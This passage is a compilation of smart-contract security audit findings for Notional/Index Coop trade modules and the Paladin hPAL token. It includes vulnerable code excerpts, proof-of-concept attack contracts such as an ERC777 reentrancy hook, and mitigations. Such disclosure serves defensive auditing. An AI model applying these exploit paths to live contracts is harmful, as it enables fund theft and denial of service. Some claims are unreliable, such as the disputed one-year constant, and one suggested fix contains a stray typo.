        returns(uint256 sentAmount)
        {
            if(_fCashAmount == 0) return 0;

            bool fromUnderlying = _isUnderlying(_fCashPosition, _sendToken);


            _approve(_setToken, _fCashPosition, _sendToken, _maxSendAmount);

            uint256 preTradeSendTokenBalance = _sendToken.balanceOf(address(_setToken));
            uint256 preTradeReceiveTokenBalance = _fCashPosition.balanceOf(address(_setToken));

            _mint(_setToken, _fCashPosition, _maxSendAmount, _fCashAmount, fromUnderlying);


            (sentAmount,) = _updateSetTokenPositions(
                _setToken,
                address(_sendToken),
                preTradeSendTokenBalance,
                address(_fCashPosition),
                preTradeReceiveTokenBalance
            );

            require(sentAmount <= _maxSendAmount, ""Overspent"");
            emit FCashMinted(_setToken, _fCashPosition, _sendToken, _fCashAmount, sentAmount);
        }

        /**
         * @dev Redeem a given fCash position for the specified receive token (either underlying or asset token)
         * @dev Alo adjust the components / position of the set token accordingly
         */
        function _redeemFCashPosition(
            ISetToken _setToken,
            IWrappedfCashComplete _fCashPosition,
            IERC20 _receiveToken,
            uint256 _fCashAmount,
            uint256 _minReceiveAmount
        )
        internal
        returns(uint256 receivedAmount)
        {
            if(_fCashAmount == 0) return 0;

            bool toUnderlying = _isUnderlying(_fCashPosition, _receiveToken);
            uint256 preTradeReceiveTokenBalance = _receiveToken.balanceOf(address(_setToken));
            uint256 preTradeSendTokenBalance = _fCashPosition.balanceOf(address(_setToken));

            _redeem(_setToken, _fCashPosition, _fCashAmount, toUnderlying);


            (, receivedAmount) = _updateSetTokenPositions(
                _setToken,
                address(_fCashPosition),
                preTradeSendTokenBalance,
                address(_receiveToken),
                preTradeReceiveTokenBalance
            );


            require(receivedAmount >= _minReceiveAmount, ""Not enough received amount"");
            emit FCashRedeemed(_setToken, _fCashPosition, _receiveToken, _fCashAmount, receivedAmount);

        }

As you can see they both uses `_isUnderlying()` to find out that if `_sendToken` is asset token or underlying token. for our specific `fcash` token, the result of `_isUnderlying()` will be `True` and `_mintFCashPosition()` and `_redeemFCashPosition()`  will call `_mint()` and `_redeem()` with `toUnderlying` set as `True`. This is `_mint()` and `_redeem()` code:

        /**
         * @dev Invokes the wrappedFCash token's mint function from the setToken
         */
        function _mint(
            ISetToken _setToken,
            IWrappedfCashComplete _fCashPosition,
            uint256 _maxAssetAmount,
            uint256 _fCashAmount,
            bool _fromUnderlying
        )
        internal
        {
            uint32 minImpliedRate = 0;

            bytes4 functionSelector = 
                _fromUnderlying ? _fCashPosition.mintViaUnderlying.selector : _fCashPosition.mintViaAsset.selector;
            bytes memory mintCallData = abi.encodeWithSelector(
                functionSelector,
                _maxAssetAmount,
                uint88(_fCashAmount),
                address(_setToken),
                minImpliedRate,
                _fromUnderlying
            );
            _setToken.invoke(address(_fCashPosition), 0, mintCallData);
        }

        /**
         * @dev Redeems the given amount of fCash token on behalf of the setToken
         */
        function _redeem(
            ISetToken _setToken,
            IWrappedfCashComplete _fCashPosition,
            uint256 _fCashAmount,
            bool _toUnderlying
        )
        internal
        {
            uint32 maxImpliedRate = type(uint32).max;

            bytes4 functionSelector =
                _toUnderlying ? _fCashPosition.redeemToUnderlying.selector : _fCashPosition.redeemToAsset.selector;
            bytes memory redeemCallData = abi.encodeWithSelector(
                functionSelector,
                _fCashAmount,
                address(_setToken),
                maxImpliedRate
            );
            _setToken.invoke(address(_fCashPosition), 0, redeemCallData);
        }

As you can see they are using `_toUnderlying` value to decide calling between (`mintViaUnderlying()` or `mintViaAsset()`) and (`redeemToUnderlying()` or `redeemToAsset()`), for our specific `fcash` `_toUnderlying` will be `True` so those functions will call `mintViaUnderlying()` and `redeemToUnderlying()` in `wfCashLogic`.
`mintViaUnderlying()` and `redeemToUnderlying()` in `wfCashLogic` execution flow eventually would call `NotionalV2` functions with `useUnderlying=True` for this specific `fcash` token, but `NotionalV2` will revert for that call because for that `fcash` token asset token is underlying token and `NotionalV2` can't handle calls with `useUnderlying==True` for that `fcash` Token. This will cause all the transaction to fail and manager can't call `redeemFCashPosition()` or `mintFCashPosition()` functions for those `fcash` tokens that asset token is underlying token.
In summery `NotionalTradeModule` logic will not work for all `fcash` tokens becasue the logic of `_isUnderlying()` is wrong for `fcash` tokens that asset token is underlying token.

### Tools Used

VIM

### Recommended Mitigation Steps

Change the logic of `_isUnderlying()` in `NotionalTradeModule` so it returns correct results for all `fcash` tokens. One simple solution can be that it first check `payment token`  value with `asset token` value.







> https://github.com/notional-finance/wrapped-fcash/pull/11/commits/0ab1ae1080c8eb14fd24d180a01f8ec2c8919022#diff-7c9f6e4700cce75c3c2abb4902f45f7398dcac73135a605b59825b26de7d6af0R245




***"
124.md,`IsWrappedFcash` check is a gas bomb,medium,"In the `_isWrappedFCash` check, the `notionalTradeModule` check whether the component is a wrappedCash with the following logic.

```solidity
        try IWrappedfCash(_fCashPosition).getDecodedID() returns(uint16 _currencyId, uint40 _maturity){
            try wrappedfCashFactory.computeAddress(_currencyId, _maturity) returns(address _computedAddress){
                return _fCashPosition == _computedAddress;
            } catch {
                return false;
            }
        } catch {
            return false;
        }
```

The above logic is dangerous when `_fCashPosition` do not revert on `getDecodedID` but instead give a wrong format of return value. The contract would try to decode the return value into `returns(uint16 _currencyId, uint40 _maturity)` and revert. The revert would consume what ever gas it's provided.

[CETH](https://etherscan.io/address/0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5) is an example.
There's a fallback function in `ceth`

```solidity
    function () external payable {
        requireNoError(mintInternal(msg.value), ""mint failed"");
    }
```

As a result, calling `getDecodedID` would not revert. Instead, calling `getDecodedID` of `CETH` would consume all remaining gas.
This creates so many issues. First, users would waste too much gas on a regular operation. Second, the transaction might fail if `ceth` is not the last position. Third, the wallet contract can not interact with set token with ceth as it consumes all gas.

### Proof of Concept

The following contract may fail to redeem setTokens as it consumes too much gas (with 20M gas limit).

[Test.sol](https://gist.github.com/Jonah246/fad9e489fe84a6fb8b4894d7377fd8a2)

```solidity
    function test(uint256 _amount) external {
        cToken.approve(address(issueModule), uint256(-1));
        wfCash.approve(address(issueModule), uint256(-1));
        issueModule.issue(setToken, _amount, address(this));
        issueModule.redeem(setToken, _amount, address(this));
    }
```

Also, we can check how much gas it consumes with the following function.

```solidity
    function TestWrappedFCash(address _fCashPosition) public view returns(bool){
        if(!_fCashPosition.isContract()) {
            return false;
        }
        try IWrappedfCash(_fCashPosition).getDecodedID() returns(uint16 _currencyId, uint40 _maturity){
            try wrappedfCashFactory.computeAddress(_currencyId, _maturity) returns(address _computedAddress){
                return _fCashPosition == _computedAddress;
            } catch {
                return false;
            }
        } catch {
            return false;
        }
    }
```

Test this function with `cdai` and `ceth`, we can observe that there's huge difference of gas consumption here.

    Gas used:            30376 of 130376
    Gas used:            19479394 of 19788041

### Tools Used

Hardhat

### Recommended Mitigation Steps

I recommend building a map in the notionalTradeModule and inserting the wrappeCash in the `mintFCashPosition` function.

```solidity
function addWrappedCash(uint16 _currencyId, uint40 _maturity) public {
    address computedAddress = wrappedfCashFactory.computeAddress(_currencyId, _maturity);
    wrappedFCash[computedAddress] = true;
}
```

Or we could replace the try-catch pattern with a low-level function call and check the return value's length before decoding it.

Something like this might be a fix.

```solidity
    (bool success, bytes memory returndata) = target.delegatecall(data);
    if (!success || returndata.length != DECODED_ID_RETURN_LENGTH) {
        return false;
    }
   // abi.decode ....
```





***"
124.md,transferfCash does not work as expected,medium,"If maturity is reached and user has asked for redeem with opts.transferfCash as true, then if (hasMatured()) turns true at wfCashLogic.sol#L216 causing fcash to be cashed out in underlying token and then sent to receiver. So receiver obtains underlying when fcash was expected. The sender wont get an error thinking fcash transfer was success

### Proof of Concept

1.  User A calls redeem with opts.transferfCash as true and receiver as User B
2.  Since maturity is reached so instead of transferring the fCash, contract would simply cash out fCash and sent the underlying token to the receiver which was not expected

### Recommended Mitigation Steps

If opts.transferfCash is true and maturity is reached then throw an error mentioning that fCash can no longer be transferred




***"
124.md,Users Might Not Be Able To Purchase Or Redeem SetToken,medium,"<https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L309>

<https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L385>

### Proof of Concept

Whenever a setToken is issued or redeemed, the `moduleIssueHook` and `moduleRedeemHook` will be triggered. These two hooks will in turn call the `_redeemMaturedPositions` function to ensure that no matured fCash positions remain in the Set by redeeming any matured fCash position.

<https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L309>

```solidity
/**
 * @dev Hook called once before setToken issuance
 * @dev Ensures that no matured fCash positions are in the set when it is issued
 */
function moduleIssueHook(ISetToken _setToken, uint256 /* _setTokenAmount */) external override onlyModule(_setToken) {
    _redeemMaturedPositions(_setToken);
}

/**
 * @dev Hook called once before setToken redemption
 * @dev Ensures that no matured fCash positions are in the set when it is redeemed
 */
function moduleRedeemHook(ISetToken _setToken, uint256 /* _setTokenAmount */) external override onlyModule(_setToken) {
    _redeemMaturedPositions(_setToken);
}
```

The `_redeemMaturedPositions` will loop through all its fCash positions and attempts to redeem any fCash position that has already matured. However, if one of the fCash redemptions fails, it will cause the entire function to revert. If this happens, no one could purchase or redeem the setToken because `moduleIssueHook` and `modileRedeemHook` hooks will revert every single time. Thus, the setToken issuance and redemption will stop working entirely and  this setToken can be considered ""bricked"".

<https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L385>

```solidity
/**
 * @dev Redeem all matured fCash positions for the given SetToken
 */
function _redeemMaturedPositions(ISetToken _setToken)
internal
{
    ISetToken.Position[] memory positions = _setToken.getPositions();
    uint positionsLength = positions.length;

    bool toUnderlying = redeemToUnderlying[_setToken];

    for(uint256 i = 0; i < positionsLength; i++) {
        // Check that the given position is an equity position
        if(positions[i].unit > 0) {
            address component = positions[i].component;
            if(_isWrappedFCash(component)) {
                IWrappedfCashComplete fCashPosition = IWrappedfCashComplete(component);
                if(fCashPosition.hasMatured()) {
                    (IERC20 receiveToken,) = fCashPosition.getToken(toUnderlying);
                    if(address(receiveToken) == ETH_ADDRESS) {
                        receiveToken = weth;
                    }
                    uint256 fCashBalance = fCashPosition.balanceOf(address(_setToken));
                    _redeemFCashPosition(_setToken, fCashPosition, receiveToken, fCashBalance, 0);
                }
            }
        }
    }
}
```

### Impact

User will not be able to purchase or redeem the setToken. User's fund will be stuck in the SetToken Contract. Unable to remove matured fCash positions from SetToken and update positions of its asset token.

### Recommended Mitigation Steps

This is a problem commonly encountered whenever a method of a smart contract calls another contract – you cannot rely on the other contract to work 100% of the time, and it is dangerous to assume that the external call will always be successful.

It is recommended to:

*   Consider alternate method of updating the asset position so that the SetToken's core functions (e.g. issuance and redemption) will not be locked if one of the matured fCash redemptions fails.

*   Evaluate if `_redeemMaturedPositions` really need to be called during SetToken's issuance and redemption. If not, consider removing them from the hooks, so that any issue or revert within `_redeemMaturedPositions` won't cause the SetToken's issuance and redemption functions to stop working entirely.

*   Consider implementing additional function to give manager/user an option to specify a list of matured fCash positions to redeem instead of forcing them to redeem all matured fCash positions at one go.


 > @jeffywu Do you see any scenario where the redemption of a matured fCash position might fail in this context`? 
> 
> EDIT: Just noticed that https://github.com/code-423n4/2022-06-notional-coop-findings/issues/226 mentions (among others) the scenario of USDC tokens being blocked which I guess is unlikely but outside of our control. This makes me think we might want to make the redemption of matured tokens during issuance / redemption optional.




***"
124.md,Residual Allowance Might Allow Tokens In SetToken To Be Stolen,medium,"<https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L418>

<https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L493>

### Proof of Concept

Whenever `_mintFCashPosition` function is called to mint new fCash position, the contract will call the `_approve` function to set the allowance to `_maxSendAmount` so that the fCash Wrapper contact can pull the payment tokens from the SetToken contract during minting.

<https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L418>

```solidity
function _mintFCashPosition(
    ISetToken _setToken,
    IWrappedfCashComplete _fCashPosition,
    IERC20 _sendToken,
    uint256 _fCashAmount,
    uint256 _maxSendAmount
)
internal
returns(uint256 sentAmount)
{
    if(_fCashAmount == 0) return 0;
    bool fromUnderlying = _isUnderlying(_fCashPosition, _sendToken); 

    _approve(_setToken, _fCashPosition, _sendToken, _maxSendAmount);

    uint256 preTradeSendTokenBalance = _sendToken.balanceOf(address(_setToken));
    uint256 preTradeReceiveTokenBalance = _fCashPosition.balanceOf(address(_setToken));

    _mint(_setToken, _fCashPosition, _maxSendAmount, _fCashAmount, fromUnderlying)

	..SNIP..
}
```

Note that `_maxSendAmount` is the maximum amount of payment tokens that is allowed to be consumed during minting. This is not the actual amount of payment tokens consumed during the minting process. Thus, after the minting, there will definitely be some residual allowance since it is unlikely that the fCash wrapper contract will consume the exact maximum amount during minting.

The following piece of code shows that having some residual allowance is expected. The `_approve` function will not set the allowance unless there is insufficient allowance.

<https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L493>

```solidity
/**
 * @dev Approve the given wrappedFCash instance to spend the setToken's sendToken 
 */
function _approve(
    ISetToken _setToken,
    IWrappedfCashComplete _fCashPosition,
    IERC20 _sendToken,
    uint256 _maxAssetAmount
)
internal
{
    if(IERC20(_sendToken).allowance(address(_setToken), address(_fCashPosition)) < _maxAssetAmount) {
        bytes memory approveCallData = abi.encodeWithSelector(_sendToken.approve.selector, address(_fCashPosition), _maxAssetAmount);
        _setToken.invoke(address(_sendToken), 0, approveCallData);
    }
}
```

### Impact

Having residual allowance increases the risk of the asset tokens being stolen from the SetToken contract. SetToken contract is where all the tokens/assets are held. If the Notional's fCash wrapper contract is compromised, it will allow the compromised fCash wrapper contract to withdraw funds from the SetToken contract due to the residual allowance.

Note that Notional's fCash wrapper contract is not totally immutable, as it is a upgradeable contract. This is an additional risk factor to be considered. If the Notional's deployer account is compromised, the attacker could upgrade the Notional's fCash wrapper contract to a malicious one to withdraw funds from the Index Coop's SetToken contract due to the residual allowance.

Index Coop and Notional are two separate protocols and teams. Thus, it is a good security practice not to place any trust on external party wherever possible to ensure that if one party is compromised, it won't affect the other party. Thus, there should not be any residual allowance that allows Notional's contract to withdraw funds from Index Coop's contract in any circumstance.

In the worst case scenario, a ""lazy"" manager might simply set the `_maxAssetAmount` to `type(uint256).max`. Thus, this will result in large amount of residual allowance left, and expose the SetToken contract to significant risk.

### Recommended Mitigation Steps

Approve the allowance on-demand whenever \_`mintFCashPosition` is called, and reset the allowance back to zero after each minting process to eliminate any residual allowance.

```diff
function _mintFCashPosition(
    ISetToken _setToken,
    IWrappedfCashComplete _fCashPosition,
    IERC20 _sendToken,
    uint256 _fCashAmount,
    uint256 _maxSendAmount
)
internal
returns(uint256 sentAmount)
{
    if(_fCashAmount == 0) return 0;
    bool fromUnderlying = _isUnderlying(_fCashPosition, _sendToken); 

    _approve(_setToken, _fCashPosition, _sendToken, _maxSendAmount);

    uint256 preTradeSendTokenBalance = _sendToken.balanceOf(address(_setToken));
    uint256 preTradeReceiveTokenBalance = _fCashPosition.balanceOf(address(_setToken));

    _mint(_setToken, _fCashPosition, _maxSendAmount, _fCashAmount, fromUnderlying)

	..SNIP..
	
+	// Reset the allowance back to zero after minting
+	_approve(_setToken, _fCashPosition, _sendToken, 0);
}
```

Update the `_approve` accordingly to remove the if-statement related to residual allowance.

```diff
function _approve(
    ISetToken _setToken,
    IWrappedfCashComplete _fCashPosition,
    IERC20 _sendToken,
    uint256 _maxAssetAmount
)
internal
{
-    if(IERC20(_sendToken).allowance(address(_setToken), address(_fCashPosition)) < _maxAssetAmount) {
        bytes memory approveCallData = abi.encodeWithSelector(_sendToken.approve.selector, address(_fCashPosition), _maxAssetAmount);
        _setToken.invoke(address(_sendToken), 0, approveCallData);
-    }
}
```





***"
124.md,DOS set token through erc777 hook,medium,"<https://github.com/code-423n4/2022-06-notional-coop/blob/main/index-coop-notional-trade-module/contracts/protocol/modules/v1/DebtIssuanceModule.sol#L131-L141>

<https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC777/ERC777.sol#L376-L380>

### Impact

The `wfCash` is an `erc777` token. [ERC777.sol#L376-L380](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC777/ERC777.sol#L376-L380) Users can get the control flow before sending token and after receiving tokens. This creates attack vectors that require extra caution in designing modules. Any combination of modules may lead to a possible exploit. To elaborate on the dangerousness of the re-entrancy attack, a possible scenario is presented.

Before the exploit, we first elaborate on three attack vectors:

1.  [DebtIssuanceModule.sol#L131-L141](https://github.com/code-423n4/2022-06-notional-coop/blob/main/index-coop-notional-trade-module/contracts/protocol/modules/v1/DebtIssuanceModule.sol#L131-L141) The issuance module would pull tokens from the sender before minting setToken.

Assume there are three compoenents in this set. 1. CDai. 2. wfCash  In the `_callTokensToSend`, the setToken has received `cdai` and the `totalSupply` is still the same.

2.  `nonReentrant` does not protect cross-contract re-entrancy. This means, that during the `issue` of issuance module, users can trigger other modules' functions.

3.  Restricted functions with `onlyManagerAndValidSet` modifier may be triggered by the exploiter as well. Manager of a setToken is usually a manager contract. Assume it's a multisig-wallet, the exploiter can front-run the execute transaction and replay the payload during his exploit. Note, a private transaction from flash-bot can still be front-run. Please refer to the [uncle bandit risk](https://docs.flashbots.net/flashbots-protect/rpc/uncle-bandits)

Given the above attack vectors, the exploiter have enough weapons to exploit the `setToken` at a propriate time. Note that different combination of modules may have different exploit paths. As long as the above attack vectors remain, the setToken is vulnerable.

Assume a setToken with `CompoundLeverageModule`, `NotionalTradeModule` and `BasicIssuanceModule` with the following positions: 1. CDAI: 100  2. wfCash-DAI 100  and totalSupply = 100. The community decides to remove the `compoundLeverageModule` from the set token. Since `notionalTradeModule` can handle cDAI, the community vote to just call `removeModule` to remove `compoundLeverageModule`. The exploiter has the time to build an exploit and wait the right timing to come.

0.  The exploiter listen the manager multisig wallet.
1.  Exploiter issue 10 setToken.
2.  During the `_callTokensToSend` of `wfcash`, the totalSupply = 100, CDAI = 110, wfCash-DAI = 110.
3.  Call `sync` of `CompoundLeverageModule`. `_getCollateralPosition` get  `_cToken.balanceOf(address(_setToken)) = 110` and `totalSupply = 100` and update the `DefaultUnit` of `CETH` 1,1X.
4.  Replay multisig wallet's payload and remove `compoundLeverageModule`.
5.  The `setToken` can no longer issue / redeem as it would raise `undercollateralized` error. Further, `setValuer` would give a pumped valuation that may cause harm to other protocols.

### Proof of Concept

[POC](https://gist.github.com/Jonah246/13e58b59765c0334189c99a9f29c6dab)
The exploit is quite lengthy. Please check the `Attack.sol` for the main exploit logic.

```solidity
    function register() public {
        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), _TOKENS_SENDER_INTERFACE_HASH, address(this));
        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), _TOKENS_SENDER_INTERFACE_HASH, address(this));
    }

    function attack(uint256 _amount) external {
        cToken.approve(address(issueModule), uint256(-1));
        wfCash.approve(address(issueModule), uint256(-1));
        issueModule.issue(setToken, _amount, address(this));
    }

    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        compoundModule.sync(setToken, false);
        manager.removeModule(address(setToken));
    }
```

### Recommended Mitigation Steps

The design choice of wfcash being an `ERC777` seems unnecessary to me. Over the past two years, ERC777 leads to so many exploits. [IMBTC-UNISWAP](https://defirate.com/imbtc-uniswap-hack/) [CREAM-AMP](https://twitter.com/CreamdotFinance/status/1432249771750686721?s=20) I recommend the team use ERC20 instead.

If the SetToken team considers supporting ERC777 necessary, I recommend implementing protocol-wide cross-contract reentrancy prevention. Please refer to Rari-Capital. [Comptroller.sol#L1978-L2002](https://github.com/Rari-Capital/fuse-v1/blob/development/src/core/Comptroller.sol#L1978-L2002)

Note that, `Rari` was [exploited](https://www.coindesk.com/business/2022/04/30/defi-lender-rari-capitalfei-loses-80m-in-hack/) given this reentrancy prevention. Simply making `nonReentrant` cross-contact prevention may not be enough. I recommend to setToken protocol going through every module and re-consider whether it's re-entrancy safe.





***"
124.md,Silent overflow of `_fCashAmount`,medium,"<https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/index-coop-notional-trade-module/contracts/protocol/modules/v1/NotionalTradeModule.sol#L526>

### Description

If a `_fCashAmount` value that is greater than uint88 is passed into the `_mint` function, downcasting it to uint88 will silently overflow.

### Recommended Mitigation Steps

```solidity
// Use a safe downcast function e.g. wfCashLogic::_safeUint88
function _safeUint88(uint256 x) internal pure returns (uint88) {hil
    require(x <= uint256(type(uint88).max));
    return uint88(x);
}
```




***"
124.md,User can alter amount returned by redeem function due to control transfer,medium,"Control is transferred to the receiver when receiving the ERC777. They are able to transfer the ERC777 to another account, at which time the before and after balance calculation will be incorrect.

            uint256 balanceBefore = IERC20(asset()).balanceOf(receiver);


            if (msg.sender != owner) {
                _spendAllowance(owner, msg.sender, shares);
            }
            _redeemInternal(shares, receiver, owner);
    /////////////
    Control is transferred to user. They can alter their balance here.
    ///////////

            uint256 balanceAfter = IERC20(asset()).balanceOf(receiver);
            uint256 assets = balanceAfter - balanceBefore;

    //////////
    Assets can be as low as 0 if they have transferred the same amount out as received.
    //////////

            emit Withdraw(msg.sender, receiver, owner, assets, shares);
            return assets;






***"
105.md,"`DropPerSecond` is not updated homogeneously, the rewards emission can be much higher than expected in some cases",high,"[HolyPaladinToken.sol#L715-L743](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L715-L743)<br>

```solidity
function _updateDropPerSecond() internal returns (uint256){
    // If no more need for monthly updates => decrease duration is over
    if(block.timestamp > startDropTimestamp + dropDecreaseDuration) {
        // Set the current DropPerSecond as the end value
        // Plus allows to be updated if the end value is later updated
        if(currentDropPerSecond != endDropPerSecond) {
            currentDropPerSecond = endDropPerSecond;
            lastDropUpdate = block.timestamp;
        }

        return endDropPerSecond;
    }

    if(block.timestamp < lastDropUpdate + MONTH) return currentDropPerSecond; // Update it once a month

    uint256 dropDecreasePerMonth = (startDropPerSecond - endDropPerSecond) / (dropDecreaseDuration / MONTH);
    uint256 nbMonthEllapsed = (block.timestamp - lastDropUpdate) / MONTH;

    uint256 dropPerSecondDecrease = dropDecreasePerMonth * nbMonthEllapsed;

    // We calculate the new dropPerSecond value
    // We don't want to go under the endDropPerSecond
    uint256 newDropPerSecond = currentDropPerSecond - dropPerSecondDecrease > endDropPerSecond ? currentDropPerSecond - dropPerSecondDecrease : endDropPerSecond;

    currentDropPerSecond = newDropPerSecond;
    lastDropUpdate = block.timestamp;

    return newDropPerSecond;
}
```

When current time is `lastDropUpdate + (2*MONTH-1)`:

`nbMonthEllapsed` will be round down to `1`, while it's actually 1.99 months passed, but because of precision loss, the smart contract will believe it's only 1 month elapsed, as a result, `DropPerSecond` will only decrease by 1 \* `dropDecreasePerMonth`.

In another word, due to the precision loss in calculating the number of months elapsed, for each `_updateDropPerSecond()` there can be a short of up to `1 * dropDecreasePerMonth` for the decrease of emission rate.

At the very edge case, if all the updates happened just like the scenario above. by the end of the `dropDecreaseDuration`, it will drop only `12 * dropDecreasePerMonth` in total, while it's expected to be `24 * dropDecreasePerMonth`.

So only half of `(startDropPerSecond - endDropPerSecond)` is actually decreased. And the last time `updateDropPerSecond` is called, `DropPerSecond` will suddenly drop to `endDropPerSecond`.

### Impact

As the `DropPerSecond` is not updated correctly, in most of the `dropDecreaseDuration`, the actual rewards emission rate is much higher than expected. As a result, the total rewards emission can be much higher than expected.

### Recommended Mitigation Steps

Change to:

```solidity
function _updateDropPerSecond() internal returns (uint256){
    // If no more need for monthly updates => decrease duration is over
    if(block.timestamp > startDropTimestamp + dropDecreaseDuration) {
        // Set the current DropPerSecond as the end value
        // Plus allows to be updated if the end value is later updated
        if(currentDropPerSecond != endDropPerSecond) {
            currentDropPerSecond = endDropPerSecond;
            lastDropUpdate = block.timestamp;
        }

        return endDropPerSecond;
    }

    if(block.timestamp < lastDropUpdate + MONTH) return currentDropPerSecond; // Update it once a month

    uint256 dropDecreasePerMonth = (startDropPerSecond - endDropPerSecond) / (dropDecreaseDuration / MONTH);
    uint256 nbMonthEllapsed = UNIT * (block.timestamp - lastDropUpdate) / MONTH;

    uint256 dropPerSecondDecrease = dropDecreasePerMonth * nbMonthEllapsed / UNIT;

    // We calculate the new dropPerSecond value
    // We don't want to go under the endDropPerSecond
    uint256 newDropPerSecond = currentDropPerSecond - dropPerSecondDecrease > endDropPerSecond ? currentDropPerSecond - dropPerSecondDecrease : endDropPerSecond;

    currentDropPerSecond = newDropPerSecond;
    lastDropUpdate = block.timestamp;

    return newDropPerSecond;
}
```




***"
105.md,System could be wrapped and made useless without contract whitelisting,high,"[HolyPaladinToken.sol#L253](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L253)<br>
[HolyPaladinToken.sol#L284](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L284)<br>
[HolyPaladinToken.sol#L268](https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L268)<br>

Anyone could create a contract or a contract factory ""PAL Locker"" with a fonction to deposit PAL tokens through a contract, lock them and delegate the voting power to the contract owner. Then, the ownership of this contract could be sold. By doing so, locked hPAL would be made liquid and transferrable again. This would eventually break the overall system of hPAL, where the idea is that you have to lock them to make them non liquid to get a boosted voting power and reward rate.

Paladin should expect this behavior to happen as we've seen it happening with veToken models and model implying locking features (see <https://lockers.stakedao.org/> and <https://www.convexfinance.com/>).

This behavior could eventually be beneficial to the original DAO (ex. <https://www.convexfinance.com/> for Curve and Frax), but the original DAO needs to at least be able to blacklist / whitelist such contracts and actors to ensure their interests are aligned with the protocol.

### Proof of Concept

To make locked hPAL liquid, Alice could create a contact C. Then, she can deposit hPAL through the contract, lock them and delegate voting power to herself. She can then sell or tokenize the ownership of the contract C.

### Recommended Mitigation Steps

Depending on if Paladin wants to be optimistic or pessimistic, implement a whitelisting / blacklisting system for contracts.

See:
[Curve-Dao-Contracts/VotingEscrow.vy#L185](https://github.com/curvefi/curve-dao-contracts/blob/4e428823c8ae9c0f8a669d796006fade11edb141/contracts/VotingEscrow.vy#L185)<br>

[FraxFinance/veFXS_Solidity.sol.old#L370](https://github.com/FraxFinance/frax-solidity/blob/7375949a73042c1e6dd14848fc4ea1ba62e36fb5/src/hardhat/contracts/FXS/veFXS_Solidity.sol.old#L370)<br>




***"
105.md,`HolyPaladinToken.sol` uses `ERC20` token with a highly unsafe pattern,medium,"In `HolyPaladinToken.sol` it imports `ERC20.sol` with some changes from the original Open Zeppelin standard.  One change is that the `transferFrom()` function does not follow the Checks Effect and Interactions safety pattern to safely make external calls to other contracts. All checks should be handled first, then any effects/state updates,  followed by the external call to prevent reentrancy attacks.  Currently the `transferFrom()` function in `ERC20.sol` used by `HolyPaladinToken.sol` calls `_transfer()` first and then updates the `sender` allowance which is highly unsafe.  The openZeppelin `ER20.sol` contract which is the industry standard first updates the `sender` allowance before calling `_transfer`.  The external call should always be done last to avoid any double spending bugs or reentrancy attacks.

### Proof of Concept

<https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html>

<https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/open-zeppelin/ERC20.sol#L149>

Open Zeppelins Implementation:<br>
<https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol>

### Recommended Mitigation Steps

Be sure to follow the Checks Effects and Interactions safety pattern as the `transferFrom` function is one of the most important functions in any protocol.  Consider importing the Open Zeppelin `ERC20.sol` contract code directly as it is battle tested and safe code.





***"
105.md,Incorrect number of seconds in `ONE_YEAR` variable,medium,"In `HolyPaladinToken.sol` the `ONE_YEAR` variable claims that there are `31557600` seconds in a year when this is incorrect.  The `ONE_YEAR` variable is used in the `getCurrentVotes()` function as well as the `getPastVotes()` function so it is vital that the correct time in seconds be used as it can effect users negatively.

### Proof of Concept

[HolyPaladinToken.sol#L25](https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L25)<br>

86,400 seconds in a day x 365 = 31\_536\_000

### Recommended Mitigation Steps

The correct number of seconds in a year is 31\_536\_000 so the `ONE_YEAR` variable should be changed to `ONE_YEAR = 31_536_000`




***"
105.md,Users at `UNSTAKE_PERIOD` can assist other users in unstaking tokens.,medium,"Consider the following scenario:
Day 0: User A stakes 200 tokens and calls the cooldown function. At this time, user A's cooldown is Day 0.
Day 15: User B stakes 100 tokens, but then wants to unstake tokens. So user A said that he could assist user B in unstaking tokens, and this could be done by deploying a smart contract.
